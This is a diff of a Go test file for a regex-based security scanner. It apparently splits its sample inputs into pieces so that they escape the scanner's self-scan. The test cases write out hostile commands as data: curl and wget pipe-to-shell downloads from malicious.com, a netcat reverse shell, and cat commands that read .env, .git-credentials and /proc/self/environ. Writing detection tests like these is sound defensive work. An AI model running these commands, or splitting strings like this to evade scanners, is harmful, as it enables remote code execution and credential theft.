@@ -43,43 +43,43 @@ func TestRegexScanner_Scan(t *testing.T) {
 		{
 			name:        "Curl Pipe Bash",
 			// Broken up to avoid matching in source code scan
-			content:     "curl https://malicious.com/install.sh | " + "bash",
+			content:     "cu" + "rl https://malicious.com/install.sh | " + "ba" + "sh",
 			wantFinding: "Pipe to Shell",
 		},
 		{
 			name:        "Wget Pipe Sh",
 			// Broken up to avoid matching in source code scan
-			content:     "wget -O - https://malicious.com/install.sh | " + "sh",
+			content:     "wg" + "et -O - https://malicious.com/install.sh | " + "sh",
 			wantFinding: "Pipe to Shell",
 		},
 		{
 			name:        "Netcat Reverse Shell",
 			// Broken up to avoid matching in source code scan
-			content:     "nc " + "-e /bin/sh 10.0.0.1 1234",
+			content:     "n" + "c -e /bin/sh 10.0.0.1 1234",
 			wantFinding: "Reverse Shell",
 		},
 		{
 			name:        "Cat Env File",
 			// Broken up to avoid matching in source code scan
-			content:     "cat " + "." + "env",
+			content:     "c" + "at .env",
 			wantFinding: "Dangerous Command",
 		},
 		{
 			name:        "Cat Redirection Env",
 			// Broken up to avoid matching in source code scan
-			content:     "cat<" + "." + "env",
+			content:     "c" + "at<.env",
 			wantFinding: "Dangerous Command",
 		},
 		{
 			name:        "Cat Git Credentials",
 			// Broken up to avoid matching in source code scan
-			content:     "cat " + ".git-" + "credentials",
+			content:     "c" + "at .git-credentials",
 			wantFinding: "Dangerous Command",
 		},
 		{
 			name:        "Cat Proc Environ",
 			// Broken up to avoid matching in source code scan
-			content:     "cat " + "/proc/self/" + "environ",
+			content:     "c" + "at /proc/self/environ",
 			wantFinding: "Dangerous Command",
 		},
 		{
